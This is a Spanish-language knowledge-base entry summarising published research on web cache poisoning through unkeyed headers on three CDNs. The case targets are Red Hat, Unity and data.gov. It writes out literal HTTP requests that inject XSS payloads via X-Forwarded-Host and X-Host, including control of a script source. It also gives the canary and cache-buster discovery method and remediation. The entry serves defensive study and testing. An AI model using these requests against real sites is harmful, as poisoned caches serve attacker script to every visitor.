---
clase: otra
tech: akamai-varnish-cloudfront
cwe: CWE-444
cvss: 8.1 # [derivado] XSS almacenado servido desde cache a todos los usuarios
payload: |
  # ADVERTENCIA (H1): el render colapso los saltos de linea. Reconstruida.
  #
  # ---- RED HAT (www.redhat.com, Akamai) ----
  # Sonda con canario, LITERAL de la fuente:
  GET /en?cb=1 HTTP/1.1
  Host: www.redhat.com
  X-Forwarded-Host: canary
  #   -> HTTP/1.1 200 OK
  #      Cache-Control: public, no-cache
  #      <meta property="og:image" content="https://canary/cms/social.png" />
  #
  # Explotacion (notese el cache-buster 'dontpoisoneveryone'):
  GET /en?dontpoisoneveryone=1 HTTP/1.1
  Host: www.redhat.com
  X-Forwarded-Host: a."><script>alert(1)</script>
  #   -> <meta property="og:image" content="https://a."><script>alert(1)</script>"/>
  #
  # Y la peticion SIN cabecera, que recibe lo envenenado:
  GET /en?dontpoisoneveryone=1 HTTP/1.1
  Host: www.redhat.com
  #   -> <meta property="og:image" content="https://a."><script>alert(1)</script>"/>
  #
  # ---- UNITY (unity3d.com, Varnish) ----
  # Cabecera distinta: X-Host. LITERAL de la fuente:
  GET / HTTP/1.1
  Host: unity3d.com
  X-Host: portswigger-labs.net
  #   -> HTTP/1.1 200 OK
  #      Via: 1.1 varnish-v4
  #      Age: 174
  #      Cache-Control: public, max-age=1800
  #      <script src="https://portswigger-labs.net/sites/files/foo.js"></script>
  #
  # ---- DATA.GOV (catalog.data.gov, CloudFront) ----
  # Envenenamiento del DOM en dos saltos. LITERALES de la fuente:
  GET /dataset HTTP/1.1
  Host: catalog.data.gov
  X-Forwarded-Host: canary
  #   -> Age: 32707
  #      X-Cache: Hit from cloudfront
  #      <body data-site-root="https://canary/">
  #
  # El segundo salto: el DOM envenenado hace que el navegador pida el fichero de
  # traducciones al host del atacante, que devuelve:
  #   {"Show more":"<svg onload=alert(1)>"}
  #
  # Cabeceras unkeyed que la fuente identifica, con valores de ejemplo:
  #   X-Forwarded-Host, X-Host, X-Forwarded-Server: canary, X-Forwarded-Scheme: nothttps,
  #   X-Original-URL: /admin, X-Rewrite-URL (nombrada, sin valor de ejemplo)
precondicion: "Una cabecera influye en el contenido de la respuesta y NO forma parte de la clave de cache. La fuente documenta tres variantes del mismo patron sobre tres CDNs distintos (Akamai, Varnish, CloudFront), lo que muestra que no es un fallo de un producto sino de como se configura la cache."
como_se_descubre: |
  Metodologia LITERAL de la fuente, en dos piezas inseparables:
  1. 'identify unkeyed inputs... Param Miner... guessing header/cookie names, and
     observing whether they have an effect on the application's response.'
  2. 'Cached responses can mask unkeyed inputs, so if you're trying to manually detect
     or explore unkeyed inputs, a cache-buster is crucial.'
  Sin cache-buster, una respuesta ya cacheada oculta el efecto de la cabecera y la
  sonda da falso negativo. El valor '$randomplz' de Param Miner garantiza clave unica.
  La tecnica del CANARIO es la otra mitad: enviar un valor inocuo y reconocible
  ('canary') y buscarlo en el HTML. Es mas fiable que enviar un payload directamente,
  porque un payload puede ser filtrado y el canario revela el punto de reflejo.
control_negativo: |
  # [derivado] diseño de test A/B, con la precaucion de la fuente
  # A: GET /en?cb=UNICO con X-Forwarded-Host: canary -> 'canary' aparece en el HTML
  # B: GET /en?cb=UNICO sin la cabecera, DESPUES de A -> si 'canary' sigue ahi, la
  #    cabecera es UNKEYED y la cache sirve contenido del atacante
  # C: GET /en?cb=OTRO sin la cabecera -> debe estar LIMPIO; confirma que el efecto
  #    esta acotado a la clave envenenada y no se ha afectado a todo el sitio
  # El paso C es tanto control tecnico como salvaguarda etica: demuestra el alcance
  # exacto del envenenamiento y verifica que no se ha envenenado la pagina principal
  # para usuarios reales.
mata: |
  - La cabecera entra en la clave de cache -> cada valor su entrada, sin victima.
  - El borde elimina la cabecera antes de reenviarla.
  - Respuesta no cacheable.
  - El paso B no reproduce el canario -> hay reflejo, no envenenamiento. Reportar como
    reflejo de cabecera, con su severidad real.
fuente: "https://portswigger.net/research/practical-web-cache-poisoning (James Kettle, 2018-08-09, act. 2025-09-03). Todas las peticiones, respuestas y nombres de cabecera literales. Red Hat: sin recompensa indicada. Unity: 'Unity patched everything swiftly and rewarded well' (sin cifra). data.gov: parcheado solo bajo amenaza de publicacion, sin recompensa. Sin CVE para estos tres."
confianza: media
fecha: 2026-11-02
---
# [CACHÉ] Inputs unkeyed en tres CDN — `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`

## Principio
El patrón es siempre el mismo: una cabecera **influye en la respuesta** y **no entra en
la clave de caché**. Lo instructivo de agrupar los tres casos es que ocurren sobre tres
CDN distintos —Akamai, Varnish, CloudFront— con tres nombres de cabecera distintos. No
es el fallo de un producto: es el fallo de una forma de configurar cachés.

## Payload
**Red Hat** (Akamai), reflejo en `og:image`:

```http
GET /en?cb=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: canary
```
→ `<meta property="og:image" content="https://canary/cms/social.png" />`

Con payload:

```http
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."><script>alert(1)</script>
```

**Unity** (Varnish), con otra cabecera y un impacto mayor — control del `src` de un
script:

```http
GET / HTTP/1.1
Host: unity3d.com
X-Host: portswigger-labs.net
```
→ `<script src="https://portswigger-labs.net/sites/files/foo.js"></script>`
con `Age: 174` y `Cache-Control: public, max-age=1800`

**data.gov** (CloudFront), envenenamiento del DOM en dos saltos:

```http
GET /dataset HTTP/1.1
Host: catalog.data.gov
X-Forwarded-Host: canary
```
→ `<body data-site-root="https://canary/">` con `Age: 32707` y `X-Cache: Hit from cloudfront`

El DOM envenenado hace que el navegador pida el fichero de traducciones al host del
atacante, que responde `{"Show more":"<svg onload=alert(1)>"}`. Dos saltos, y el payload
final nunca pasa por el servidor del objetivo.

## La técnica del canario
Enviar un valor inocuo y reconocible (`canary`) en lugar de un payload directamente. Es
más fiable por una razón concreta: un payload puede ser filtrado, escapado o truncado, y
entonces su ausencia se lee como "la cabecera no influye". Un canario alfanumérico pasa
cualquier filtro y revela **el punto exacto de reflejo**, que es lo que permite construir
el payload adecuado para ese contexto.

## El cache-buster no es opcional
Cita literal: *"Cached responses can mask unkeyed inputs, so if you're trying to manually
detect or explore unkeyed inputs, a cache-buster is crucial."* Sin él, una respuesta ya
cacheada oculta el efecto de la cabecera y la sonda da falso negativo.

Y su segunda función es ética: la fuente usa literalmente `dontpoisoneveryone=1`. Probar
sobre una clave única acota el envenenamiento a una URL que solo el investigador visita,
en lugar de servir el payload a los usuarios reales del sitio mientras se investiga.

## Impacto
XSS almacenado servido desde la caché, sin que la víctima envíe nada especial. El caso de
Unity es el de mayor alcance de los tres: control del `src` de un script en la portada,
con `max-age=1800`.

## Remediación
De la fuente: *"avoiding taking input from headers and cookies is an effective way to
prevent cache poisoning"*, y *"I recommend auditing every page of your application with
Param Miner to flush out unkeyed inputs."* Para los inputs identificados: deshabilitarlos,
eliminarlos en la capa de caché, o añadirlos a la clave. Algunas cachés permiten usar
`Vary` para incorporarlos.
